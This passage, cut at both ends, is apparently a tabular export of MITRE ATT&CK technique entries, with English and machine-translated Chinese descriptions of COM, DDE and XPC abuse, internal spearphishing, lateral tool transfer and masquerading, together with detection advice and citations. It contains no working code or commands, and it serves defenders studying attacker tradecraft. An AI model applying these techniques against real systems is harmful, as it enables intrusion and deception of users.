来执行任意代码或命令。 IPC 机制可能因操作系统而异，但通常以可通过编程语言/库或本机接口访问的形式存在，例如 Windows [动态数据交换](https://attack.mitre.org/techniques/T1559/002) 或 [组件对象模型](https://attack.mitre.org/techniques/T1559/001)。 Linux 环境支持几种不同的 IPC 机制，其中两种是套接字和管道。（引用：Linux IPC）更高级别的执行介质，例如 [Command and Scripting Interpreter]（https://attack.mitre.org/techniques/ T1059)s，也可以利用底层 IPC 机制。攻击者也可以使用[远程服务](https://attack.mitre.org/techniques/T1021)例如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003)来促进远程 IPC 执行。（引用：Fireeye Hunting COM 2019 年 6 月）
T1559.001,Inter-Process Communication: Component Object Model,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)

Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",https://attack.mitre.org/techniques/T1559/001,12 February 2020,26 July 2021,1.1,Execution,"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)

Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. ",Windows,"Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1559,,,,1.0,,,,,"(Citation: ESET Hermetic Wizard March 2022),(Citation: ESET Gelsemium June 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Securelist MuddyWater Oct 2018),(Citation: Bromium Ursnif Mar 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: ClearSky MuddyWater June 2019),(Citation: ESET Trickbot Oct 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET InvisiMole June 2020),(Citation: ESET Gamaredon June 2020),(Citation: Microsoft NICKEL December 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Eset Ramsay May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Microsoft Protected View),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft COM ACL),(Citation: Microsoft System Wide Com Keys)",进程间通信：组件对象模型,攻击者可能会使用 Windows 组件对象模型 (COM) 来执行本地代码。 COM 是本机 Windows 应用程序编程接口 (API) 的进程间通信 (IPC) 组件，可实现软件对象或实现一个或多个接口的可执行代码之间的交互。（引文：Fireeye Hunting COM 2019 年 6 月）通过 COM，客户端对象可以调用服务器对象的方法，这些对象通常是二进制动态链接库 (DLL) 或可执行文件 (EXE)。（引用：Microsoft COM）远程 COM 执行由 [远程服务]（https://attack.mitre .org/techniques/T1021) 例如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003) (DCOM)。(Citation: Fireeye Hunting COM June 2019) 暴露了各种COM接口可被滥用以通过各种编程语言（例如 C、C++、Java 和 [Visual Basic]）调用任意执行（https://attack.mitre.org/techniques/T1059/005）。（引用：Microsoft COM ) 还存在特定的 COM 对象以直接执行代码执行之外的功能，su ch 作为创建 [计划任务/作业](https://attack.mitre.org/techniques/T1053)、无文件下载/执行以及与权限升级和持久性相关的其他攻击者行为。（引文：Fireeye Hunting COM 2019 年 6 月)（引用：ProjectZero 文件写入 EoP 2018 年 4 月）
T1559.002,Inter-Process Communication: Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)

Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",https://attack.mitre.org/techniques/T1559/002,12 February 2020,22 February 2022,1.2,Execution,"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).

OLE, Office Open XML, CSV, and other files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )",Windows,"Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1559,,,User,1.0,,,,,"(Citation: McAfee APT28 DDE2 Nov 2017),(Citation: McAfee Sharpshooter December 2018),(Citation: PWC KeyBoys Feb 2017),(Citation: ESET RTM Feb 2017),(Citation: Symantec Gallmaker Oct 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Talos Cobalt Group July 2018),(Citation: Talos GravityRAT),(Citation: CyberScoop FIN7 Oct 2017),(Citation: Securelist ScarCruft Jun 2016),(Citation: Accenture MUDCARP March 2019),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: SentinelOne Valak June 2020),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Proofpoint TA505 June 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Eset Ramsay May 2020),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Talos PoetRAT April 2020),(Citation: BleepingComputer DDE Disabled in Word Dec 2017),(Citation: Enigma Reviving DDE Jan 2018),(Citation: Microsoft ADV170021 Dec 2017),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: Microsoft Protected View),(Citation: Microsoft DDE Advisory Nov 2017),(Citation: Microsoft ASR Nov 2017)",进程间通信：动态数据交换,攻击者可能使用 Windows 动态数据交换 (DDE) 来执行任意命令。 DDE 是一种客户端-服务器协议，用于应用程序之间的一次性和/或连续进程间通信 (IPC)。建立链接后，应用程序可以自主交换由字符串、暖数据链接（数据项更改时的通知）、热数据链接（数据项更改的重复）和命令执行请求组成的事务。对象链接和嵌入 (OLE)，或在文档之间链接数据的能力，最初是通过 DDE 实现的。尽管已被 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) 取代，DDE 仍可通过注册表项在 Windows 10 和 Microsoft Office 2016 的大部分版本中启用。（引用：BleepingComputer DDE 已禁用在 Word 2017 年 12 月）（引用：Microsoft ADV170021 Dec 2017）（引用：Microsoft DDE 咨询 2017 年 11 月）Microsoft Office 文档可以直接或通过嵌入文件被 DDE 命令毒化，并用于通过 [网络钓鱼]（https： //attack.mitre.org/techniques/T1566) 活动或托管 Web 内容，避免使用 Visual Basic for Applications (VBA) 宏。（引用：SensePost PS DDE 2016 年 5 月）（引用：Kettle CSV DDE 2014 年 8 月）（引文：Enigma Reviving DDE Jan 2018）（引文：SensePost MacroLess DDE Oct 2017）同样，攻击者可以通过将 DDE 公式嵌入到旨在通过Windows 电子表格程序。（引用：OWASP CSV注入）（引用：CSV Excel 宏注入）DDE 也可能被在无法直接访问 [命令和脚本解释器]（https://attack.mitre.org/techniques/ T1059)。 DDE执行可以通过[远程服务](https://attack.mitre.org/techniques/T1021)远程调用，例如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003) ）（DCOM）。（引文：Fireeye Hunting COM 2019 年 6 月）
T1559.003,Inter-Process Communication: XPC Services,"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)

Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",https://attack.mitre.org/techniques/T1559/003,12 October 2021,20 April 2022,1.0,Execution,,macOS,Process: Process Access,True,T1559,,Csaba Fitzl @theevilbit of Offensive Security,,0.0,,,,,",",进程间通信：XPC 服务,攻击者可以向 XPC 服务守护程序提供恶意内容以执行本地代码。 macOS 使用 XPC 服务在各种进程之间进行基本的进程间通信，例如 XPC 服务守护进程和第三方应用程序特权帮助工具之间。应用程序可以使用低级 XPC 服务 <code>C API</code> 或高级 <code>NSXPCConnection API</code> 向以 root 身份运行的 XPC 服务守护程序发送消息，以处理以下任务：需要提升的权限（例如网络连接）。应用程序负责提供作为 XPC 服务蓝图的协议定义。开发人员通常使用 XPC 服务来提供应用程序稳定性和应用程序客户端和守护程序之间的权限分离。（引用：createXPCservices）（引用：Designing Daemons Apple Dev）攻击者可以滥用 XPC 服务来执行恶意内容。恶意执行请求可以通过应用程序的 XPC 服务处理程序传递。（引用：CVMServer Vuln）（引用：学习 XPC Exploitation）这还可能包括识别和滥用不正确的 XPC 客户端验证和/或对输入参数进行不良清理以进行 [Exploitation用于权限提升](https://attack.mitre.org/techniques/T1068)。
T1534,Internal Spearphishing,"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)

Adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.

There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)",https://attack.mitre.org/techniques/T1534,04 September 2019,08 March 2022,1.2,Lateral Movement,"Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing campaigns.(Citation: Trend Micro When Phishing Starts from the Inside 2017)","Google Workspace, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC); Tim MalcomVetter",User,,,,,,"(Citation: KISA Operation Muzabi),(Citation: SecureWorks August 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Gamaredon June 2020),(Citation: CISA AA21-200A APT40 July 2021),",内部鱼叉式钓鱼,"攻击者可能会使用内部鱼叉式网络钓鱼来访问其他信息或利用同一组织内的其他用户，因为他们已经可以访问环境中的帐户或系统。内部鱼叉式网络钓鱼是多阶段的活动，其中通过使用先前安装的恶意软件控制用户的设备或通过破坏用户的帐户凭据来拥有电子邮件帐户。攻击者试图利用受信任的内部帐户来增加诱骗目标陷入网络钓鱼尝试的可能性。（引用：趋势科技当网络钓鱼从 2017 年内部开始时）攻击者可能会利用 [鱼叉式网络钓鱼附件]（https:// attack.mitre.org/techniques/T1566/001) 或 [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) 作为内部鱼叉式钓鱼的一部分，以传递有效负载或重定向到外部站点在模仿电子邮件登录界面的网站上通过 [Input Capture](https://attack.mitre.org/techniques/T1056) 捕获凭据。已经发生过使用内部鱼叉式网络钓鱼的值得注意的事件。 Eye Pyramid 活动使用带有恶意附件的网络钓鱼电子邮件在受害者之间进行横向移动，在此过程中损害了近 18,000 个电子邮件帐户。（引文：趋势科技当网络钓鱼从 2017 年开始时）叙利亚电子军 (SEA) 在金融时报 (FT) 窃取额外的帐户凭据。一旦英国《金融时报》获悉该活动并开始警告员工该威胁，SEA 就会发送模仿金融时报 IT 部门的网络钓鱼电子邮件，并能够危害更多用户。（引用：金融时报有限公司 2019。）"
T1570,Lateral Tool Transfer,"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)

Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).",https://attack.mitre.org/techniques/T1570,11 March 2020,19 April 2022,1.2,Lateral Movement,Monitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.,"Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Metadata, Named Pipe: Named Pipe Metadata, Network Share: Network Share Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",False,,,,,,,,,,"(Citation: Microsoft GALLIUM December 2019),(Citation: Microsoft FTP),(Citation: DustySky),(Citation: Unit42 LockerGoga 2019),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Turla PowerShell May 2019),(Citation: FoxIT Wocao December 2019),(Citation: FireEye FIN10 June 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Linux FTP),(Citation: Sophos Netwalker May 2020),(Citation: Talos Olympic Destroyer 2018),(Citation: Symantec Waterbug Jun 2019),(Citation: LOLBAS Expand),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Microsoft About BITS),(Citation: TechNet Copy),(Citation: PsExec Russinovich),(Citation: LogRhythm WannaCry),(Citation: Dragos Crashoverride 2018),(Citation: CrowdStrike Grim Spider May 2019),(Citation: NCC Group Chimera January 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: LOLBAS Esentutl),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Microsoft Preventing SMB),(Citation: University of Birmingham C2)",利用工具横向传输,攻击者可能会在受感染环境中的系统之间传输工具或其他文件。一旦进入受害环境（即 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)），文件可能会从一个系统复制到另一个系统，以便在一个手术。攻击者可以在内部受害系统之间复制文件，以支持使用固有文件共享协议的横向移动，例如通过 [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) 将文件共享到连接的网络共享或通过 [远程桌面协议](https://attack.mitre.org/techniques/T1021/001) 使用经过身份验证的连接。(Citation: Unit42 LockerGoga 2019) 文件也可以使用受害者系统上的本机或其他工具传输，例如 scp、rsync、curl、sftp 和 [ftp](https://attack.mitre.org/software/S0095)。
T1036,Masquerading,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",https://attack.mitre.org/techniques/T1036,31 May 2017,05 May 2022,1.4,Defense Evasion,"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

Look for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters""\u202E"", ""[U+202E]"", and ""%E2%80%AE”.","Containers, Linux, Windows, macOS","Command: Command Execution, File: File Metadata, File: File Modification, Image: Image Metadata, Process: Process Metadata, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata",False,,Application Control,"Bartosz Jerzman; David Lu, Tripwire; Elastic; Felipe Espósito, @Pr0teus; Nick Carr, Mandiant; Oleg Kolesnikov, Securonix",,,,CAPEC-177,,,"(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Cyberreason Anchor December 2019),(Citation: SentinelOne NobleBaron June 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: ClearSky Siamesekitten August 2021),(Citation: MSTIC FoggyWeb September 2021),(Citation: Google Election Threats October 2020),(Citation: Unit42 Redaman January 2019),(Citation: Trend Micro Tick November 2019),(Citation: Securelist Octopus Oct 2018),(Citation: Symantec RAINDROP January 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Talos Nyetya June 2017),(Citation: Group IB Ransomware September 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: FireEye APT10 Sept 2018),(Citation: objective-see windtail1 dec 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Eset Ramsay May 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: ESET Dukes October 2019),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Trend Micro DRBControl February 2020),(Citation: KISA Operation Muzabi),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT TA18-074A),(Citation: Check Point APT34 April 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Medium S2W WhisperGate January 2022),(Citation: McAfee Lazarus Jul 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Twitter ItsReallyNick Platinum Masquerade),(Citation: Cylance Dust Storm),(Citation: BlackBerry Bahamut),(Citation: DFIR Conti Bazar Nov 2021),",伪装,攻击者可能会尝试操纵其工件的功能，以使它们对用户和/或安全工具显得合法或良性。当为了逃避防御和观察而操纵或滥用合法或恶意对象的名称或位置时，就会发生伪装。这可能包括操纵文件元数据、诱骗用户错误识别文件类型以及提供合法的任务或服务名称。重命名可滥用的系统实用程序以逃避安全监控也是一种[伪装]（https://attack.mitre.org/techniques/T1036）。（引用：LOLBAS主站点）
T1036.007,Masquerading: Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) 

Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)

Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",https://attack.mitre.org/techniques/T1036/007,04 August 2021,14 October 2021,1.0,Defense Evasion,"Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.(Citation: Seqrite DoubleExtension)",Windows,"File: File Creation, File: File Metadata",True,T1036,,,,,,,,,"(Citation: ClearSky Siamesekitten August 2021),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Cybereason Bazar July 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: HowToGeek ShowExtension),(Citation: Seqrite DoubleExtension)",伪装：双文件扩展名,攻击者可能会滥用文件名中的双扩展名来伪装真实的文件类型。文件名可能包含次要文件类型扩展名，这可能会导致仅显示第一个扩展名（例如：<code>File.txt.exe</code> 在某些视图中可能仅呈现为<code>File.txt</代码>）。但是，第二个扩展名是确定文件如何打开和执行的真实文件类型。实际文件扩展名可能会被文件浏览器中的操作系统隐藏（例如：explorer.exe），以及使用或类似于系统策略配置的任何软件中。（引用：PCMag DoubleExtension）（引用：SOCPrime DoubleExtension）攻击者可能会滥用双重扩展名来试图隐藏有效载荷的危险文件类型。一种非常常见的用法是诱使用户打开他们认为是良性文件类型但实际上是可执行代码的文件。此类文件通常以电子邮件附件的形式出现，并允许攻击者通过 [Spearphishing Attachment](https://attack.mitre. org/techniques/T1566/001) 然后 [用户执行](https://attack.mitre.org/techniques/T1204)。例如，一个名为<code>Evil.txt.exe</code> 的可执行文件附件可以向用户显示为<code>Evil.txt</code>。然后，用户可能会将其视为良性文本文件并打开它，无意中执行了隐藏的恶意软件。（引用：SOCPrime DoubleExtension）常见文件类型，例如文本文件（.txt、.doc 等）和图像文件（. jpg、.gif 等）通常用作出现良性的第一个扩展名。通常被视为危险的可执行扩展名，例如 .exe、.lnk、.hta 和 .scr，通常作为第二个扩展名和真实文件类型出现。
T1036.001,Masquerading: Invalid Code Signature,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)

Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",https://attack.mitre.org/techniques/T1036/001,10 February 2020,10 February 2020,1.0,Defense Evasion,"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.","Windows, macOS",File: File Metadata,True,T1036,,,,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: objective-see windtail1 dec 2018),(Citation: Securelist ScarCruft Jun 2016),(Citation: SANS Windshift August 2018),(Citation: McAfee Netwire Mar 2015),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Kaspersky Regin),",伪装：无效的代码签名,攻击者可能会尝试模仿有效代码签名的特征，以增加欺骗用户、分析师或工具的机会。代码签名为开发人员的二进制文件提供了一定程度的真实性，并保证二进制文件未被篡改。攻击者可以从已签名程序中复制元数据和签名信息，然后将其用作未签名程序的模板。具有无效代码签名的文件将无法通过数字签名验证检查，但它们对用户来说可能看起来更合法，并且安全工具可能会不正确地处理这些文件。（引用：Threatexpress MetaTwin 2017）与 [代码签名] 不同（https://attack.mitre. org/techniques/T1553/002），此活动不会产生有效的签名。
T1036.004,Masquerading: Masquerade Task or Service,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.

Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",https://attack.mitre.org/techniques/T1036/004,10 February 2020,18 October 2021,1.1,Defense Evasion,"Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","Linux, Windows, macOS","Command: Command Execution, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata",True,T1036,,,"Administrator, SYSTEM, User",,,,,,"(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Kroll RawPOS Jan 2017),(Citation: FireEye APT32 May 2017),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Zscaler Higaisa 2020),(Citation: Volexity SolarWinds),(Citation: Malwarebytes Higaisa 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Tarrask scheduled task),(Citation: Talos TinyTurla September 2021),(Citation: Talos Frankenstein June 2019),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ESET Machete July 2019),(Citation: Symantec Volgmer Aug 2014),(Citation: McAfee Shamoon December 2018),(Citation: Group IB APT 41 June 2021),(Citation: Trend Micro Tick November 2019),(Citation: ESET TeleBots Oct 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: ESET Crutch December 2020),(Citation: Microsoft Win Defender Truvasys Sep 2017),(Citation: ESET InvisiMole June 2020),(Citation: Morphisec FIN7 June 2017),(Citation: ESET ComRAT May 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Bitdefender StrongPity June 2020),(Citation: Talos Promethium June 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Cybereason Bazar July 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Sophos Maze VM September 2020),(Citation: Unit 42 PingPull Jun 2022),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Symantec Backdoor.Nidiran),(Citation: ESET Telebots Dec 2016),(Citation: Bitdefender Naikon April 2021),(Citation: Microsoft SAM),(Citation: ESET Okrum July 2019),(Citation: FireEye APT10 April 2017),(Citation: Unit42 RDAT July 2020),(Citation: Mandiant APT1 Appendix),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET Attor 